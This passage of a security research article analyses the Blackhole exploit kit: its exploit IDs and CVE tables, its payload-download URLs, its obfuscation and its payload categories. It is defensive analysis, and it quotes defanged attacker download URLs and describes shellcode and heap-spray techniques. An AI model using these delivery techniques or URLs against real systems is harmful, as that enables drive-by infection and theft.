shellcode delivered by the <span class="emphasis"><em>Flash</em></span> exploit can contain a list of file references, matching the above URL, but with a different file ID for each, as in the following example:</p><pre class="programlisting">hxxp://spicyplaces.com/l/r.php?f=9235d&amp;e=1
hxxp://spicyplaces.com/l/r.php?f=c5826&amp;e=1
hxxp://spicyplaces.com/l/r.php?f=182b5&amp;e=1
</pre><p>The variation of the HCP exploiting script with the code embedded into the mainfile response script can accept multiple parameters in the form: hxxp://spicyplaces.com/l/data/hcp_vbs.php?f=9235d::c5826::182b5&amp;d=0::0::0. Both the file ID and the exploit ID can now serve multiple values. The variation that inserts only a link to the mainfile code also serves multiple payloads but in the old-fashioned way, serving them sequentially, one by one. This change was introduced in version 1.2.4, and only applied to the HCP function.</p><p><a href="#table.3">Table 3</a> identifies the mapping between the exploit ID (the <span class="emphasis"><em>e</em></span> query parameter) and the delivered exploit content in the sample gathered at the beginning of the inspection period, the most recent field samples, and the original 1.0.2 code. (It was not possible to positively identify all cases, as samples were not always available, hence the question marks in the table.)</p><div class="table"><a id="table.3"></a><table border="1" summary="Exploit ID to exploit mappings."><colgroup><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Exploit ID</th><th align="center">1.2.0 (2011.11)</th><th align="center">1.2.5 (2012/09)</th><th align="center">Server code (v.1.0.2)</th></tr></thead><tbody><tr><td>0</td><td>Java (CVE-2010-4452)</td><td>Java (CVE-2010-0840,CVE-2012-0507)</td><td>XMLHTTP+ADODB (MS06-014)</td></tr><tr><td>1</td><td>-</td><td>SWF (CVE-2011-0611)</td><td>JAR (CVE-2010-0886)</td></tr><tr><td>2</td><td>JAR (CVE-2010-0886)</td><td>XMLHTTP+ADODB (MS06-014)</td><td>CVE-2010-1885 + XMLHTTP+ADODB</td></tr><tr><td>3</td><td>Java (?)</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659)</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659)</td></tr><tr><td>4</td><td>XMLHTTP+ADODB (MS06-014)</td><td>PDF (CVE-2010-0188)</td><td>PDF (CVE-2010-0188)</td></tr><tr><td>5</td><td>HCP (CVE-2010-1885)</td><td>HCP (CVE-2010-1885)</td><td>CVE-2010-0806</td></tr><tr><td>6</td><td>PDF (?)</td><td>?</td><td>Java (CVE-2010-0840,CVE-2012-0507)</td></tr><tr><td>7</td><td>-</td><td>CVE-2012-1889</td><td>-</td></tr><tr><td>8</td><td>SWF (CVE-2011-0611)</td><td>-</td><td>-</td></tr></tbody></table><p class="title"><b>Table&nbsp;4.&nbsp;Exploit ID to exploit mappings.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2455555"></a>Downloadfile</h3></div></div></div><p>This stage of the attack is reached when the connect-back code from the activated exploit reaches back to the server, issuing a request with a specific format:</p><pre class="programlisting">http://{server}/{downloadfile}?f=73a07?e=1</pre><p>In the above URL the downloadfile variable is determined in config.php. The most common values we observed were d.php, w.php and q.php.</p><p>The parameter <span class="emphasis"><em>f </em></span>is the unique ID in the SQL database: this identifies which file from the data directory should be returned. The returned payload is dependent only on the value of <span class="emphasis"><em>f</em></span>, regardless of the value of parameter e. Normally, we would expect that as the attacks are updated with new executables (which change frequently to avoid detection by anti-virus software), this value would increase on the same site. This was indeed observed in the first couple of attacks, although they were hosted on different servers. This implies that the database was likely dumped and imported when transferring the backend. Later, a huge change was observed, from file ID 97 to ea498. From then on, file IDs were five-digit hexadecimal numbers that were reused within attacks. As an example, 182b5 was seen from 05/06/2012 until 10/09/2012.</p><p>The parameter <span class="emphasis"><em>e</em></span> identifies the exploit that was completed in the download. It is stored in the database along with the IP address of the infected host. This information is later used for tracking the exploit statistics.</p><p>If for any reason the <span class="emphasis"><em>e</em></span> parameter is missing, a default value (4 in the case of 1.0.2) is taken, which belongs to a PDF (CVE-2010-0188) exploit. And as we look at the mainfile code, we can see that when constructing the PDF exploit code corresponding to the value 4, the e parameter tag is not appended to the end of the connect-back URL, which makes this default assignment logical.</p><p>Upon receiving this request, the server code builds a response. That response will include an executable payload inserted as application/x-msdownload content type, the content of which is determined by the f parameter of the request.</p><p>The filename of the download is randomly selected from the list: &#39;readme&#39;, &#39;info&#39;, &#39;contacts&#39;, &#39;about&#39; and &#39;calc&#39; to make the download appear less suspicious. The extension is always &#39;.exe&#39;.</p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4121051"></a>Individual exploits</h2></div></div></div><p>The author of the exploit kit has been busy over the past two years keeping his creation up to date. As new popular exploit code has become available, he has added it to the code base and eventually removed old and not so useful vulnerabilities.</p><p><a href="#table.4a">Table 4a</a> and <a href="#table.4b">Table 4b</a> summarize the exploit content of each of the exploit functions for all contemporary Blackhole versions.</p><p>In the following sections we describe the individual exploit functions deployed by Blackhole. Only the latest samples were analysed in more detail, older versions can be tracked from <a href="#table.4a">Table 4a</a> and <a href="#table.4b">Table 4b</a>. If data for a particular exploit is missing, it is because I couldn&rsquo;t find it in any of the analysed samples belonging to the particular version of the exploit kit.</p><div class="table"><a id="table.4a"></a><table border="1" summary="Exploit delivery in different versions of the Blackhole
      kit."><colgroup><col /><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Exploit function</th><th align="center">1.1.0</th><th align="center">1.2.0</th><th align="center">1.2.1</th><th align="center">1.2.2</th></tr></thead><tbody><tr><td>spl0</td><td>Java (CVE-2010-0840)</td><td>Java (CVE-2010-4452)</td><td>Java (CVE-2010-4452)</td><td>N/A</td></tr><tr><td>spl1</td><td>Java (CVE-2010-4452)</td><td>N/AExp</td><td>Java (CVE-2010-0840)</td><td>N/A</td></tr><tr><td>spl2</td><td>Java (CVE-2010-0886)</td><td>Java (CVE-2010-0886) - (new.avi -&gt; exe download)</td><td>XMLHTTP + ADODBSTREAM downloader</td><td>(MS06-014) XMLHTTP + ADODBSTREAM downloader (MS06-014)</td></tr><tr><td>spl3</td><td>Java (CVE-2010-3552)</td><td>Java (CVE-2010-3552)</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td></tr><tr><td>spl4</td><td>N/A</td><td>XMLHTTP+ADODB (MS06-014)</td><td>N/A</td><td>N/A</td></tr><tr><td>spl5</td><td>PDF (CVE-2010-0188)</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324) or CVE-2010-0188</td><td>Flash (CVE-2011-0611)</td><td>Flash (CVE-2011-0611)</td></tr><tr><td>spl6</td><td>HCP (CVE-2010-1885)</td><td>N/A</td><td>N/A</td><td>N/A</td></tr><tr><td>spl7</td><td>N/A</td><td>N/A</td><td>N/A</td><td>N/A</td></tr><tr><td>NOJS</td><td>N/A</td><td>Java (CVE-2010-0840, CVE-2012-0507)</td><td>N/A</td><td>Java (CVE-2010-0840, CVE-2012-0507)</td></tr></tbody></table><p class="title"><b>Table&nbsp;5.&nbsp;Exploit delivery in different versions of the Blackhole kit.</b></p></div><div class="table"><a id="table.4b"></a><table border="1" summary="Exploit delivery in different versions of the Blackhole
      kit."><colgroup><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Exploit function</th><th align="center">1.2.3</th><th align="center">1.2.4</th><th align="center">1.2.5</th></tr></thead><tbody><tr><td>spl0</td><td>Java (CVE-2010-4452)</td><td>N/A</td><td>N/A</td></tr><tr><td>spl1</td><td>N/A</td><td>N/A</td><td>N/A</td></tr><tr><td>spl2</td><td>XMLHTTP + ADODBSTREAM downloader (MS06-014)</td><td>N/A</td><td>XMLHTTP + ADODBSTREAM downloader (MS06-014)</td></tr><tr><td>spl3</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td><td>PDF (CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td></tr><tr><td>spl4</td><td>N/A</td><td>HCP (CVE-2010-1885) XMLHTTP+ADODB</td><td>HCP (CVE-2010-1885) XMLHTTP+ADODB</td></tr><tr><td>spl5</td><td>Flash (CVE-2011-0611)</td><td>Flash (CVE-2011-0611)</td><td>Flash (CVE-2011-0611)</td></tr><tr><td>spl6</td><td>N/A</td><td>Flash (CVE-2011-2110)</td><td>Flash (CVE-2011-2110)</td></tr><tr><td>spl7</td><td>N/A</td><td>N/A</td><td>CVE-2012-1889</td></tr><tr><td>NOJS</td><td>Java (CVE-2010-0840, CVE-2012-0507)</td><td>Java (CVE-2010-0840, CVE-2012-0507)</td><td>Java (CVE-2010-0840, CVE-2012-0507)</td></tr></tbody></table><p class="title"><b>Table&nbsp;6.&nbsp;Exploit delivery in different versions of the Blackhole kit.</b></p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4310184"></a>spl0: empty</h3></div></div></div><p>This exploit function used to deliver Java exploits (CVE-2010-0840 or CVE-2010-4452) in early versions, but since version 1.2.4 it has not been used.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3467583"></a>spl1: missing</h3></div></div></div><p>This exploit function delivered the same Java exploits as spl0, though not the same ones at the same time. From version 1.2.2 onwards it has been completely absent from the scripts &ndash; not even an empty skeleton was left in the call chain.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2188363"></a>spl2: MDAC exploit MS06-014</h3></div></div></div><p>This exploit function used a version of the classic VBScript downloader method that was very popular among script downloaders some 10 years ago. The only improvement over those old-timers is the access to the shell object, which instead of the CreateObject method makes use of some exploitable ActiveX objects.</p><p>The XMLHTTP object is utilized to download the file and the ADODB.Stream to save it to a local file. Then the exploited object is used to run the saved executable, as shown in <a href="#figure.4">Figure 4</a>.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="MS06-014 downloader." src="/uploads/images/figures/2012/12/Blackhole-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;MS06-014 downloader.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4432664"></a>spl3: PDF</h3></div></div></div><p>This exploit function delivers the PDF exploits. The PluginDetect library is used to determine the version of the<span class="emphasis"><em> AdobeReader</em></span> plug-in, and depending on the version, one of two possible PDF file generator PHP functions is called: the first for PDF versions below the main version 8, and the second for all 8.x PDF versions, and for all 9.x versions where x&lt;=3. The decision logic is shown in <a href="#figure.5">Figure 5</a>.</p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="PDF delivery decision logic." src="/uploads/images/figures/2012/12/Blackhole-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;PDF delivery decision logic.</b></p></div><p>The show_pdf() function appends an additional HTML child element that contains the link to the PDF generator server-side PHP script. This appended element can either be an IFRAME or an object, depending on the OS and browser version (see <a href="#table.1a">Table 1a</a> and <a href="#table.1b">Table 1b</a>).</p><p>The first PDF is a compound in itself, serving four different exploits. Depending on the <span class="emphasis"><em>Adobe Reader </em></span>version, the following exploit codes are delivered [<span class="citation"><a href="#citation.2">2</a></span>]:</p><div class="itemizedlist"><ul type="disc"><li><p>All major versions 9 and for major version 8 until 8.12: CVE-2008-2992 (Collab.getIcon)</p></li><li><p>All major versions 6 and for major version 7 before 7.11: CVE-2007-5659 (Collab.collectEmailInfo)</p></li><li><p>Version 7.1: CVE-2008-2992 (util.printf)</p></li><li><p>Versions between 8.12 and 8.2 (boundaries not included): CVE-2009-4324 (media.newPlayer).</p></li></ul></div><p>The second PDF delivers only one exploit, CVE-2010-0188 (libtiff). The obfuscation of both of the PDF types is the same; it is sufficient to examine only one of them, which will be CVE-2010-0188.</p><p>The main script code is stored as data and distributed along the various PDF fields (Author, Subject, Keyword, Creator, Producer), with the hex-encoded shellcode being separate in the Title field.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Encrypted main script is stored in PDF fields." src="/uploads/images/figures/2012/12/Blackhole-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Encrypted main script is stored in PDF fields.</b></p></div><p>The encoded main body is decoded by a simple decode script stored in the PDF which results in a script that uses the common heap-spray technique and builds the shellcode from the content of the Title field of the PDF.</p><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="Heap spray and shellcode builder." src="/uploads/images/figures/2012/12/Blackhole-7.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;Heap spray and shellcode builder.</b></p></div><p>(To view a larger version of Figure 7 click <a href="/uploads/images/figures/2012/12/Blackhole-7-large.jpg" target="_top">here</a>.)</p><p>The shellcode itself is nothing special; it is the usual boring downloader code that we have seen in web attacks many times over. The <span class="emphasis"><em>Windows</em></span> API names are looked up by the usual ror 0x0d encoded checksums.</p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="The traditional shellcode." src="/uploads/images/figures/2012/12/Blackhole-8.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;The traditional shellcode.</b></p></div><p>This shellcode is the same in all exploit functions, the only difference is that while in most cases it is XORed with 0x28 and the code starts with a short decryptor, in the cases of the PDF libtiff exploit and the HCP exploit, the XOR layer is missing from the top of the shellcode.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3910153"></a>spl4: Windows Help and Support Center Vulnerability</h3></div></div></div><p>This exploit function delivers the exploit for vulnerability CVE-2010-1885. It is used in two forms. In some cases the script is only linked into the mainfile script, in other cases the downloader script is actually embedded into it. Which is actually selected depends on the OS and browser version (see <a href="#table.1a">Table 1a</a> and <a href="#table.1b">Table 1b</a>).</p><div class="figure"><a id="figure.9"></a><div class="mediaobject"><img alt="Directly embedded downloader code." src="/uploads/images/figures/2012/12/Blackhole-9.jpg" /></div><p class="title"><b>Figure&nbsp;9.&nbsp;Directly embedded downloader code.</b></p></div><p>In either case, the downloader code is the classical XMLHTTP+ADODB downloader, which does not need to use the MDAC exploit.</p><div class="figure"><a id="figure.10"></a><div class="mediaobject"><img alt="Decoded downloader code." src="/uploads/images/figures/2012/12/Blackhole-10.jpg" /></div><p class="title"><b>Figure&nbsp;10.&nbsp;Decoded downloader code.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4746007"></a>pl5: Flash CVE-2011-0611</h3></div></div></div><p>This exploit function delivers the CVE-2011-0611 <span class="emphasis"><em>Adobe Flash</em></span> vulnerability in multiple stages, using two SWF files. The components are shown in <a href="#figure.11">Figure 11</a>.</p><div class="figure"><a id="figure.11"></a><div class="mediaobject"><img alt="The mainfile fragment of the SWF attack." src="/uploads/images/figures/2012/12/Blackhole-11.jpg" /></div><p class="title"><b>Figure&nbsp;11.&nbsp;The mainfile fragment of the SWF attack.</b></p></div><p>The stage 1 component allocates and fills large enough memory buffers in order to make the preparations for the second stage.</p><p>This SWF file (field.swf) utilizes the ExternalInterface class of the ActionScript language that allows the code running in the SWF file to communicate with the embedding container &ndash; which in this case is the mainfile script. The communication in this case consists of calling the getAllocSize, getBlockSize, etc. functions, then getCN, which loads the second stage SWF.</p><div class="figure"><a id="figure.12"></a><div class="mediaobject"><img alt="ExternalInterface function calls in stage 1 SWF." src="/uploads/images/figures/2012/12/Blackhole-12.jpg" /></div><p class="title"><b>Figure&nbsp;12.&nbsp;ExternalInterface function calls in stage 1 SWF.</b></p></div><p>(To view a larger version of Figure 12 click <a href="/uploads/images/figures/2012/12/Blackhole-12-large.jpg" target="_top">here</a>.)</p><p>The second stage file (score.swf) drops an SWF file that calls getShellCode() to get the shellcode. This shellcode is then invoked by the conditions set by the heap spray.</p><div class="figure"><a id="figure.13"></a><div class="mediaobject"><img alt="Calling getShellCode from the second SWF component." src="/uploads/images/figures/2012/12/Blackhole-13.jpg" /></div><p class="title"><b>Figure&nbsp;13.&nbsp;Calling getShellCode from the second SWF component.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4552423"></a>spl6: Flash CVE-2011-2110</h3></div></div></div><p>This exploit code has recently been added (from v. 1.2.4) to the Blackhole menu. The function embeds an SWF file as an object into the mainfile response page.</p><div class="figure"><a id="figure.14"></a><div class="mediaobject"><img alt="Spl6 in the mainfile script." src="/uploads/images/figures/2012/12/Blackhole-14.jpg" /></div><p class="title"><b>Figure&nbsp;14.&nbsp;Spl6 in the mainfile script.</b></p></div><p>(To view a larger version of Figure 14 click <a href="/uploads/images/figures/2012/12/Blackhole-14-large.jpg" target="_top">here</a>.)</p><p>The loaded SWF file has an ActionScript downloader script which will connect back to download the binary payload.</p><div class="figure"><a id="figure.15"></a><div class="mediaobject"><img alt="The decompiled ActionScript code." src="/uploads/images/figures/2012/12/Blackhole-15.jpg" /></div><p class="title"><b>Figure&nbsp;15.&nbsp;The decompiled ActionScript code.</b></p></div><p>(To view a larger version of Figure 15 click <a href="/uploads/images/figures/2012/12/Blackhole-15-large.jpg" target="_top">here</a>.)</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2352920"></a>spl7: XML Core Services &ndash; CVE-2012-1889</h3></div></div></div><p>This exploit function is interesting in that it sheds some light on the development practice of an exploit author. The exploit was apparently used in targeted attacks as early as March 2012. At least some live samples popped up using it on the popular website analysis tool, jsunpack.jeek.org. The first public appearance of the code was on 24 May on Chinese website baidu.com. From this point, events unfolded rapidly. Microsoft published an advisory on 12 June. Four days later, support for the vulnerability was added to the Metasploit framework. At around the same time, the Blackhole author was interviewed and confirmed that support for the vulnerability would be added to Blackhole soon. Finally, on 22 June, version 1.2.5 was released including this exploit.</p><div class="figure"><a id="figure.16"></a><div class="mediaobject"><img alt="Timeline of CVE-2012-1889." src="/uploads/images/figures/2012/12/Blackhole-16.jpg" /></div><p class="title"><b>Figure&nbsp;16.&nbsp;Timeline of CVE-2012-1889.</b></p></div><p>The timeline of this particular exploit suggests that the support was added in haste. Looking at the result, one can see immediately that this code is a distinct block in the server code: the coding style is not integrated into the general style of the mainfile script. Not even the indentation conforms to the standards (i.e. no indentation, no unnecessary whitespaces) of the mainfile script.</p><div class="figure"><a id="figure.17"></a><div class="mediaobject"><img alt="CVE-2012-1889 code in Blackhole." src="/uploads/images/figures/2012/12/Blackhole-17.jpg" /></div><p class="title"><b>Figure&nbsp;17.&nbsp;CVE-2012-1889 code in Blackhole.</b></p></div><p>(To view a larger version of Figure 17 click <a href="/uploads/images/figures/2012/12/Blackhole-17-large.jpg" target="_top">here</a>.)</p><p>If we compare the added code with the most authentic source we know of &ndash; that published in May on baidu.com &ndash; it is easy to see that the code was copy-pasted into Blackhole. The function order, the variable names, the indentation, the constants &ndash; in short, everything is an exact copy of that code.</p><div class="figure"><a id="figure.18"></a><div class="mediaobject"><img alt="The genuine CVE-2012-1889 code from China." src="/uploads/images/figures/2012/12/Blackhole-18.jpg" /></div><p class="title"><b>Figure&nbsp;18.&nbsp;The genuine CVE-2012-1889 code from China.</b></p></div><p>The major difference is the shellcode, which is the standard used in all other exploit functions, this time not XOR encrypted.</p><p>Evidently, support for this exploit was added to the kit in a hurry &ndash; more as a PR move to prove that the author could react quickly, than as a real improvement. In fact, the author must have been convinced of the rather limited use of his enhancement, because in the field only a handful of cases were observed in which this exploit was turned on. In the vast majority of the cases this exploit function remained empty.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4422461"></a>NOJS: Java &ndash; CVE-2010-0840</h3></div></div></div><p>This part of the mainfile response page works without JavaScript support. It loads a Java archive, which receives the encrypted URL as a parameter. The encryption is a simple replacement cypher, using a randomly swapped alphabet string as the replacement key.</p><div class="figure"><a id="figure.19"></a><div class="mediaobject"><img alt="URL obfuscation in Java downloader." src="/uploads/images/figures/2012/12/Blackhole-19.jpg" /></div><p class="title"><b>Figure&nbsp;19.&nbsp;URL obfuscation in Java downloader.</b></p></div><p>The Java downloaders use different levels of obfuscation. In the simplest cases the strings are only reversed, broken up into smaller chunks, or encrypted.</p><div class="figure"><a id="figure.20"></a><div class="mediaobject"><img alt="Simple string obfuscations in Blackhole Java components." src="/uploads/images/figures/2012/12/Blackhole-20.jpg" /></div><p class="title"><b>Figure&nbsp;20.&nbsp;Simple string obfuscations in Blackhole Java components.</b></p></div><p>(To view a larger version of Figure 20 click <a href="/uploads/images/figures/2012/12/Blackhole-20-large.jpg" target="_top">here</a>.)</p><p>There were also more complex cases when the obfuscation was solved with the Zelix KlassMaster professional Java protection tool [<span class="citation"><a href="#citation.4">4</a></span>].</p><p>Zelix KlassMaster (ZKM) is an efficient tool that makes analysis very complicated, hiding the string constants from the decompilation output. It is worth noting that the version of ZKM was 5.4.3 in all of the observed Blackhole-related files. The author didn&rsquo;t care to upgrade to the currently available 5.5.0 version.</p><p>The usage of ZKM is not exclusive &ndash; in other class files the code is left readable, only the string constants are obfuscated with simple methods.</p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3384127"></a>Why Java?</h2></div></div></div><p>When I started the analysis of the Blackhole server-side code, I had a couple of questions in mind (needless to say, the number of questions multiplied with each day). The very first question came when I looked at the exploit distribution statistics available from a few Blackhole back-ends. All had the same characteristics that are shown in <a href="#figure.21">Figure 21</a>: an overwhelming dominance of Java exploitations.</p><div class="figure"><a id="figure.21"></a><div class="mediaobject"><img alt="Exploit deliverance stats." src="/uploads/images/figures/2012/12/Blackhole-21.jpg" /></div><p class="title"><b>Figure&nbsp;21.&nbsp;Exploit deliverance stats.</b></p></div><p>In each of them, Java exploits proved to be the most effective infection vectors &ndash; always by a large margin. I had a couple of ideas as to the possible reason for this phenomenon:</p><div class="itemizedlist"><ul type="disc"><li><p>The mainfile logic is skewed and favours Java over the other vulnerabilities &ndash; it serves the others only if Java distribution fails.</p></li><li><p>The mainfile is bogus, and if some exploit function crashes, the rest will not have a chance to activate &ndash; whereas the NOJS Java component always executes.</p></li><li><p>The downloadfile logic does not count subsequent download attempts after the first one (which is usually the NOJS Java that does not need time-consuming decryption) hits the server.</p></li></ul></div><p>After evaluating the code, it turned out that none of my hypotheses were true. The Blackhole exploit kit doesn&rsquo;t favour any of the individual exploit functions. At this point, running out of ideas, I had to follow the advice of Sir Arthur Conan Doyle&#39;s detective Sherlock Holmes: &lsquo;Once you eliminate the impossible, whatever remains, no matter how improbable, must be the truth.&rsquo;</p><p>So after eliminating the above hypotheses, I was left with the following, however ridiculous it sounds: the Java security fixes are not installed on the end-users&rsquo; computers. Users don&rsquo;t consider Java to be an immediate threat, and consequently don&rsquo;t rush to update their systems. And that is the biggest security challenge regarding web threats. We need to make users aware that, right now, Java is the weakest spot &ndash; and it is heavily under attack.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4852045"></a>Version 2.0</h2></div></div></div><p>This research was about to finish when a new major version of Blackhole (2.0) was released. This paper will not cover that version in detail, however it deserves at least a brief mention.</p><p>The most important new features of this version are [<span class="citation"><a href="#citation.7">7</a></span>] (as claimed by the author):</p><div class="itemizedlist"><ul type="disc"><li><p>Direct download of executable payloads is prevented.</p></li><li><p>Exploit contents are only loaded when the client is considered vulnerable.</p></li><li><p>Use of the PluginDetect library in Java versioning has been dropped (reducing the necessary code size significantly).</p></li><li><p>Some old exploits have been removed (leaving Java atomic and byte, PDF LibTIFF, MDAC).</p></li><li><p>The predictable URL structure has been changed (filenames and querystring parameter names).</p></li><li><p>Machine stats have been updated to include <span class="emphasis"><em>Windows 8 </em></span>and mobile devices.</p></li><li><p>A better breakdown of plug-in version information is provided.</p></li><li><p>The checking of the referrer has been improved.</p></li><li><p>TOR traffic is blocked.</p></li><li><p>A self-learning mode is available for blacklisting (outside of distribution campaigns, all downloads could be considered from security researchers, thus blacklisted).</p></li></ul></div><p>The URL structure of versions 1.x was indeed very predictable, allowing URL-filtering products to block infection attempts easily. This has been changed, the query parameter names are now random, and the values are obfuscated.</p><p>The mainfile response script starts with the attenuated PluginDetect code, which contains only the<span class="emphasis"><em> Adobe Reader </em></span>versioning.</p><p>That is followed by the individual exploit functions &ndash; and there are not many of them left, only PDF and MS06-014 were observed, with the additional NOJS Java downloader.</p><p>The exploit functions are not chained one after the other, instead they follow each other in separate try{} constructs.</p><div class="figure"><a id="figure.22"></a><div class="mediaobject"><img alt="Blackhole v2.0 code." src="/uploads/images/figures/2012/12/Blackhole-22.jpg" /></div><p class="title"><b>Figure&nbsp;22.&nbsp;Blackhole v2.0 code.</b></p></div><p>(To view a larger version of Figure 22 click <a href="/uploads/images/figures/2012/12/Blackhole-22-large.jpg" target="_top">here</a>.)</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4447978"></a>Payloads</h2></div></div></div><p>At some point, usually around the end of an analysis, we have to ask ourselves: what for? What is the likely objective of the Blackhole distribution campaigns? It can be best understood by inspecting the downloaded executable payloads, because from the point of view of the infection process, that component is the final destination.</p><p>The chart in <a href="#figure.23">Figure 23</a> breaks down the payloads observed over a two-month period (August and September 2012) into major categories.</p><div class="figure"><a id="figure.23"></a><div class="mediaobject"><img alt="Payload breakdown." src="/uploads/images/figures/2012/12/Blackhole-23.jpg" /></div><p class="title"><b>Figure&nbsp;23.&nbsp;Payload breakdown.</b></p></div><p>It clearly shows the motivation of the purchasers of Blackhole: financial gain. The largest chunk of the distributed payload samples either collect money directly (FakeAV, Ransomware), steal information to gain money (ZBot, password stealers), or take part in click fraud (ZeroAccess). The rest are backdoors and downloaders that facilitate the attacks.</p><p>The sole purpose of Blackhole operators is to make money &ndash; which shouldn&rsquo;t come as a surprise. Nevertheless, the above chart explains the large number of ongoing complaints about fake AV and ransomware infections. Nothing personal, it&rsquo;s just about the money.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2797639"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] <span class="bibliosource"><a href="/virusbulletin/2012/10/inside-black-hole-part-1
" target="_top">http://www.virusbtn.com/virusbulletin/archive/2012/10/vb201210-Blackhole</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] <span class="bibliosource"><a href="https://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit" target="_blank">http://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] <span class="bibliosource"><a href="http://www.pinlady.net/PluginDetect" target="_blank">http://www.pinlady.net/PluginDetect</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] <span class="bibliosource"><a href="http://www.zelix.com/klassmaster/index.html" target="_blank">http://www.zelix.com/klassmaster/index.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] <span class="bibliosource"><a href="http://blog.unmaskparasites.com/2011/03/24/blackhole-defs_colors-and-createcss-injections" target="_blank">http://blog.unmaskparasites.com/2011/03/24/blackhole-defs_colors-and-createcss-injections</a></span>.</p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] <span class="bibliosource"><a href="http://malware.dontneedcoffee.com/2012/10/neosploit-now-showing-bh-ek-20-like.html" target="_blank">http://malware.dontneedcoffee.com/2012/10/neosploit-now-showing-bh-ek-20-like.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] <span class="bibliosource"><a href="https://nakedsecurity.sophos.com/2012/09/13/new-version-of-blackhole-exploit-kit" target="_blank">http://nakedsecurity.sophos.com/2012/09/13/new-version-of-blackhole-exploit-kit</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Part 2: Interaction with a black hole&url=https://www.virusbulletin.com/virusbulletin/2012/12/part-2-interaction-black-hole"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2012/12/part-2-interaction-black-hole'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2012/12/part-2-interaction-black-hole&title=Part 2: Interaction with a black hole"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2012/12/part-2-interaction-black-hole&t=Part 2: Interaction with a black hole"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2012/12/part-2-interaction-black-hole"><img src='/uploads/images/buttons/reddit.png' 